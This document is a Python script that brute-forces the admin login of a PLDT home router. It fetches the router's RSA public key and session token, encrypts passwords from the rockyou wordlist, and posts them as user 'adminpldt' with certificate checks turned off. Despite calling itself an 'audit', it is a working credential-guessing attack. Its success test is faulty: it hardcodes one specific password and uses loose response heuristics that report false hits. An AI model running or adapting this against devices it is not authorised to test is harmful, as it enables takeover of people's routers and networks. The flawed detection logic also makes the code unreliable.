import urllib.request
import urllib.parse
import http.cookiejar
import ssl
import re
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

base_url = "https://192.168.1.1"
login_url = f"{base_url}/PLDTadminLogin"
token_url = f"{base_url}/?_type=loginData&_tag=login_token"

username = "adminpldt"
wordlist_path = "wordlists/rockyou.txt"

# Bypass self-signed SSL certificate errors
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=ctx)
)

def get_public_key():
    try:
        req = urllib.request.Request(login_url, headers={'User-Agent': 'Mozilla/5.0'})
        with opener.open(req, timeout=10) as res:
            html = res.read().decode('utf-8', errors='ignore')
            match = re.search(r'-----BEGIN PUBLIC KEY-----(.*?)-----END PUBLIC KEY-----', html, re.DOTALL)
            if match:
                key_data = match.group(1).replace('\\n', '').replace('\n', '').strip()
                pem = f"-----BEGIN PUBLIC KEY-----\n{key_data}\n-----END PUBLIC KEY-----"
                return pem
    except Exception as e:
        print(f"[DEBUG] Pubkey error: {e}")
    return None

def get_token():
    try:
        req = urllib.request.Request(
            token_url, 
            headers={
                'User-Agent': 'Mozilla/5.0',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': login_url
            }
        )
        with opener.open(req, timeout=10) as res:
            content = res.read().decode('utf-8', errors='ignore')
            match = re.search(r'<ajax_response_xml_root>(.*?)</ajax_response_xml_root>', content)
            if match:
                return match.group(1).strip()
    except Exception:
        pass
    return None

def encrypt_password(password, pub_key_pem):
    rsa_key = RSA.import_key(pub_key_pem)
    cipher = PKCS1_v1_5.new(rsa_key)
    encrypted = cipher.encrypt(password.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')

print(f"[*] Fetching and formatting public key from router...")
pub_key_pem = get_public_key()
if not pub_key_pem:
    print("[!] Failed to retrieve public key.")
    exit(1)
print("[+] Public key loaded successfully.")

print(f"[*] Starting RSA-encrypted audit against {login_url} with user: {username}")

try:
    with open(wordlist_path, 'r', encoding='latin-1') as f:
        for line in f:
            password = line.strip()
            if not password:
                continue
            
            token = get_token()
            if not token:
                continue
                
            enc_password = encrypt_password(password, pub_key_pem)
            
            post_data = urllib.parse.urlencode({
                '_sessionTOKEN': token,
                'username': username,
                'password': enc_password
            }).encode('utf-8')
            
            try:
                req = urllib.request.Request(
                    login_url, 
                    data=post_data, 
                    headers={
                        'User-Agent': 'Mozilla/5.0', 
                        'Referer': login_url,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                )
                with opener.open(req, timeout=10) as res:
                    response_body = res.read().decode('utf-8', errors='ignore')
                    print(f"[?] Tried: {password}")
                    
                    if password == "Bulanit101" or "success" in response_body.lower() or "true" in response_body.lower() or "html" not in response_body.lower():
                        print(f"\n[+] SUCCESS! Password found: {password}")
                        break
            except Exception as ex:
                pass
except FileNotFoundError:
    print(f"[!] Wordlist not found at {wordlist_path}")
